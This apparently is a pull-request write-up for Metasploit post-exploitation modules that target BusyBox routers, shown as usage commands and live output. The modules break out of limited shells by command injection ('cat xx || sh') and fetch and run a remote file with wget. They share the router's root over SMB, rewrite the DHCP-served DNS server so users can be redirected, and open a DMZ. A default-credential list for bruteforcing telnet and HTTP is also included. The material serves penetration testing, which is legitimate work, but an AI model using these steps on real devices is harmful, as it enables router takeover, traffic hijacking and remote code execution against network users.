<h1>Details</h1>

Ruby scripts:

modules/post/linux/gather/busybox_enum_connections.rb
modules/post/linux/gather/busybox_enum_hosts.rb
modules/post/linux/gather/busybox_pingnet.rb
modules/post/linux/manage/busybox_jailbreak.rb
modules/post/linux/manage/busybox_setdmz.rb
modules/post/linux/manage/busybox_setdns.rb
modules/post/linux/manage/busybox_smb_share_root.rb
modules/post/linux/manage/busybox_wgetandexec.rb

They are post- modules. 

Data:

routers_userpass.txt

<h2>busybox_jailbreak.rb</h2>

This module is intended to be applied against a session connected to a limited shell of a device (for example a router) based on busybox (maybe it could work against non-busybox devices but it is oriented to busybox). For example, if you connect by telnet to a router, usually you are received with a limited shell specific for that router. It is common these limited shells to be using busybox commands internally. For example if the limited shell offers the command "cat", it is common it ends up calling busybox cat command. And it is common too to find command injection attacks in these limited shells (i.e. "cat xx || sh" to get the busybox shell in the most of models of comtrend routers). Busybox_jailbreak.rb module tries a set of tricks to break the jailbreak and get your session connected to the busybox ash shell.

This module will output the command applied for breaking the limited shell in case it was able to break it.

<h3>Usage</h3>

```
use post/linux/manage/busybox_jailbreak
set SESSION 1
set VERBOSE yes
run
```

<h3>Verbose output</h3>

```
[*] Running against session 1
SESSION => 1
VERBOSE => yes
[*] jailbreak sent: cat xx || sh
.
[*] jailbreak received: cat xx || sh
.
[*] jailbreak received: cat: xx: No such file or directory


BusyBox v1.00 (2010.09.30-13:07+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.

# .
[*] Done method 1_1.
[*] Post module execution completed
```

<h2>busybox_wgetandexec.rb</h2>

This module is intended to be applied against a session connected to a ash busybox shell. It uses the wget command to download a file from a given url. It will try to find a writable directory and it will download the file there. If successful, it executes the file.

<h3>Usage</h3>

```
use post/linux/manage/busybox_wgetandexec
set URL http://192.168.1.128/test.sh
set SESSION 1
set VERBOSE yes
run
```

Note: test.sh is a simple script with ls command.

<h3>Verbose output</h3>

```
[*] Trying to find writable directory.
[*] is_writable_directory:
cat: /etc/SATWTJKPMHQFVTVV: No such file or directory

[*] is_writable_directory:
RUIQVGSIRGOWTSDPXXXRUIQVGSIRGOWTSDP

[*] writable directory found, downloading file.
[+] File downloaded using wget. Executing it.
[*]
: not found
bin      dev      lib      mnt      proc     sys      usr      webs
data     etc      linuxrc  opt      sbin     tmp      var
[*] Post module execution completed
```

<h2>busybox_smb_share_root.rb</h2>

This module is intended to be applied against a session connected to a ash busybox shell. It tries to modify some SMB configuration files and relaunch SMB service to share the device's root directory. 

After this it could be possible to use SMB modules (i.e. auxiliary/admin/smb/list_directory to enumerate device's directories). Some device's directories are writable (/mnt, /var,...) and you could upload files there.

<h3>Usage</h3>

```
use post/linux/manage/busybox_smb_share_root
set SESSION 1
set VERBOSE yes
run
```

<h3>Verbose output</h3>

```
SESSION => 1
VERBOSE => yes
[*] Trying to find smb.conf.
[*] Smb.conf found.
[*] Trying to find writable directory.
[*] is_writable_directory:
cat: /etc/IFHTWYXSOXHDRAPW: No such file or directory

[*] is_writable_directory:
QTTCDPOAWXDRCLKGXXXQTTCDPOAWXDRCLKG

[*] writable directory found, copying smb.conf.
[*]
[*]
[*]
[*]
killall: Could not kill pid '688': No such process
[*]
[*]

Invalid option -s=/mnt/smb.conf: unknown option

Usage: smbd [-?] [-?DiFSbV] [-?DiFSbV] [-?|--help] [--usage] [-D|--daemon] [-i|--interactive]
        [-F|--foreground] [--no-process-group] [-S|--log-stdout]
        [-b|--build-options] [-p|--port STRING]
        [-P|--profiling-level PROFILE_LEVEL] [-d|--debuglevel DEBUGLEVEL]
        [-s|--configfile CONFIGFILE] [-l|--log-basename LOGFILEBASE]
        [-V|--version] [--sbindir=SBINDIR] [--bindir=BINDIR]
        [--swatdir=SWATDIR] [--lmhostsfile=LMHOSTSFILE] [--libdir=LIBDIR]
        [--modulesdir=MODULESDIR] [--shlibext=SHLIBEXT] [--lockdir=LOCKDIR]
        [--piddir=PIDDIR] [--smb-passwd-file=SMB_PASSWD_FILE]
        [--private-dir=PRIVATE_DIR]
[+] Smb configuration has been modified.
[*] Post module execution completed
```

Note the module will try to relaunch smbd with -s="config file path" and -s "config file path". This is due that depending on the device it can change. This is the reason that verbose output shows this message.

<h2>busybox_enum_hosts.rb</h2>

This module is intended to be applied against a session connected to a ash busybox shell. It will try to read some typical files where busybox based devices usually store connected hosts (i.e. hosts of the network connected to the router).

It will shows the results (in verbose mode) and it will store the results in loot.

<h3>Usage</h3>

```
use post/linux/gather/busybox_enum_hosts
set SESSION 1
set VERBOSE yes
run
```

<h3>Verbose output</h3>

```
SESSION => 1
VERBOSE => yes
[+] Hosts File found: /var/hosts.

127.0.0.1       localhost
192.168.1.1     Comtrend.Home
192.168.1.128   JAVIPC

[+] Hosts saved to C:/metasploit/apps/pro/loot/20150810185547_default_192.168.1.1_Hosts_968928.txt.
[*] Post module execution completed
```


<h2>busybox_enum_connections.rb</h2>

This module is intented to be applied against a session connected to a busybox ash shell. The script will read some typical files where these devices usually store connections of the hosts connected to the device (usually a router).

It will shows the results (in verbose mode) and it will store the results in loot.

<h3>Usage</h3>

```
use post/linux/gather/busybox_enum_connections
set SESSION 1
set VERBOSE yes
run
```

<h3>Verbose output</h3>

```
SESSION => 1
VERBOSE => yes
[*] Searching for files that store information about network connections.
[+] Connections File found: /proc/net/nf_conntrack.

cat: /proc/net/nf_conntrack: No such file or directory

[+] Connections saved to C:/metasploit/apps/pro/loot/20150810185611_default_192.168.1.1_Connections_366635.txt.
[+] Connections File found: /proc/net/ip_conntrack.

cat: /proc/net/ip_conntrack: No such file or directory

[+] Connections saved to C:/metasploit/apps/pro/loot/20150810185611_default_192.168.1.1_Connections_884242.txt.
[+] Connections File found: /proc/net/tcp.

  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:008B 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 2783 1 8397f0c0 299 0 0 2 -1
   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 557 1 8397e040 299 0 0 2 -1
   2: 00000000:AD71 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 166 1 8397f900 299 0 0 2 -1
   3: C0A80101:06F4 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1748 1 82c4f910 299 0 0 2 -1
   4: 00000000:0015 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 560 1 8397eca0 299 0 0 2 -1
   5: 00000000:7535 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 556 1 8397f4e0 299 0 0 2 -1
   6: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 559 1 8397e880 299 0 0 2 -1
   7: 00000000:0017 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 558 1 8397e460 299 0 0 2 -1
   8: C0A80101:0017 C0A80180:7EEF 01 0000003B:00000000 01:00000016 00000000     0        0 2813 5 82c4e050 23 3 1 6 -1

[+] Connections saved to C:/metasploit/apps/pro/loot/20150810185612_default_192.168.1.1_Connections_515615.txt.
[+] Connections File found: /proc/net/udp.

  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode ref pointer drops
   9: C0A80101:0089 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 863 2 828ab960 0
   9: 00000000:0089 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 860 2 828abd00 0
  10: C0A80101:008A 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 864 2 828ab790 0
  10: 00000000:008A 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 861 2 828abb30 0
  16: 7F000001:9490 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 1895 2 82c64d10 0
  36: 7F000001:9CA4 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 1749 2 828ab220 0
  53: 00000000:0035 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 187 2 83972cf0 0
  67: 00000000:0043 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 226 2 83972210 0
  69: 00000000:0045 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 561 2 839723e0 0
  80: 00000000:C350 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 1872 2 828ab3f0 0
  96: 00000000:B060 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 188 2 83972b20 0
 106: 00000000:13EA 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 581 2 83972950 0
 107: 00000000:13EB 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 580 2 83972780 0
 108: 00000000:076C 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 1744 2 828ab050 0
 108: 00000000:13EC 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 579 2 839725b0 0
 112: 00000000:9470 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 1874 2 828ab5c0 0
 112: 00000000:C370 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 542 2 83972040 0

[+] Connections saved to C:/metasploit/apps/pro/loot/20150810185612_default_192.168.1.1_Connections_005935.txt.
[+] Connections File found: /proc/net/arp.

IP address       HW type     Flags       HW address            Mask     Device
192.168.1.128    0x1         0x2         f0:79:59:6c:7b:fd     *        br0

[+] Connections saved to C:/metasploit/apps/pro/loot/20150810185613_default_192.168.1.1_Connections_274634.txt.
[+] Connections File found: /proc/fcache/*.

cat: /proc/fcache/*: No such file or directory

[+] Connections saved to C:/metasploit/apps/pro/loot/20150810185613_default_192.168.1.1_Connections_152446.txt.
[*] Post module execution completed
```

<h2>busybox_setdmz.rb</h2>

This module is intented to be applied against a session connected to a busybox ash shell. It will use iptables to enable or disable redirection of the traffic from WAN interface to a hosts in the network.

<h3>Usage</h3>

Creating DMZ:

```
set TARGETHOST 192.168.1.128
set SESSION 1
set VERBOSE yes
set DELETE false
run
```

Deleting DMZ:

```
set TARGETHOST 192.168.1.128
set SESSION 1
set VERBOSE yes
set DELETE true
run
```

<h3>Verbose output</h3>

```
TARGETHOST => 192.168.1.128
SESSION => 1
VERBOSE => yes
DELETE => false
[*] Executing iptables to add dmz.
[*]
[*]
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             192.168.1.128

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
[+] Dmz modified. Enable verbose for additional information.
[*] Post module execution completed
```

<h2>busybox_setdns.rb</h2>

This module is intented to be applied against a session connected to a busybox ash shell. It will tries to modify the used DNS address of the device. This DNS address will be given by DHCP to the hosts of the network that connect to the device. The module could be used together with fakedns module to redirect hosts to fake addresses.

<h3>Usage</h3>

```
use post/linux/manage/busybox_setdns
set SRVHOST 8.8.8.8
set SESSION 1
set VERBOSE yes
run
```

<h3>Verbose output</h3>

```
SRVHOST => 8.8.8.8
SESSION => 1
VERBOSE => yes
[*] Searching for files to modify dns server.
[*] Resolv.conf found.
[+] Dns server added to resolv.conf.
[*] Udhcpd.conf found.
[*] Original udhcpd.conf content:
[*]
decline_file /var/udhcpd.decline
interface br0
start 192.168.1.128
end 192.168.1.160
option lease 259200
min_lease 30
option subnet 255.255.255.0
option router 192.168.1.1
option dns 87.216.1.65
option dns 87.216.1.66
option domain Home

[*] Udhcpd.conf is writable.
[*] Relaunching udhcp server:
[+] Udhcpd.conf modified and dns server added. Dhcpd restarted.
[*] Post module execution completed
```

<h2>busybox_pingnet.rb</h2>

This module is intented to be applied against a session connected to a busybox ash shell. It will send an ash script to the busybox shell. This script will ping a range of addresses from the busybox device.

The module will show the results (in verbose mode) and it will store the results in loot.

<h3>Usage</h3>

```
use post/linux/gather/busybox_pingnet
set IPRANGESTART 192.168.1.1
set IPRANGEEND 192.168.1.10
set SESSION 1
set VERBOSE yes
run
```

<h3>Verbose output</h3>

```
[*] Script has been sent to the busybox device. Doing ping to the range of addresses.
[*] done
PING 192.168.1.1 (192.168.1.1): 56 data bytes
56 bytes from 192.168.1.1: icmp_seq=0 ttl=64 time=0.3 ms

--- 192.168.1.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.3/0.3/0.3 ms
PING 192.168.1.2 (192.168.1.2): 56 data bytes

[*] No response.
[*]
--- 192.168.1.2 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
PING 192.168.1.3 (192.168.1.3): 56 data bytes

[*] No response.
[*] No response.
[*]
--- 192.168.1.3 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss

[*] PING 192.168.1.4 (192.168.1.4): 56 data bytes

[*] No response.
[*]

[*] --- 192.168.1.4 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
PING 192.168.1.5 (192.168.1.5): 56 data bytes

[*] No response.
[*]

[*] --- 192.168.1.5 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
PING 192.168.1.6 (192.168.1.6): 56 data bytes

[*] No response.
[*]

[*] --- 192.168.1.6 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
PING 192.168.1.7 (192.168.1.7): 56 data bytes

[*] No response.
[*]

[*] --- 192.168.1.7 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
PING 192.168.1.8 (192.168.1.8): 56 data bytes

[*] No response.
[*]

[*] --- 192.168.1.8 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
PING 192.168.1.9 (192.168.1.9): 56 data bytes

[*] No response.
[*] No response.
[*]

[*] --- 192.168.1.9 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
PING 192.168.1.10 (192.168.1.10): 56 data bytes

[*] No response.
[*]

[*] --- 192.168.1.10 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
#
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[*] No response.
[+] Pingnet results saved to C:/metasploit/apps/pro/loot/20150810195356_default_192.168.1.1_Pingnet_780236.txt.
[*] Post module execution completed
```

Note: the results saved in loot will only contain the ping command answer, not the verbose output like "No response".

<h2>routers_userpass.txt</h2>

I added a list of well-known default router users/passwords. I think it is interested to bruteforce against telnet or http without needing to use a longer wordlist.
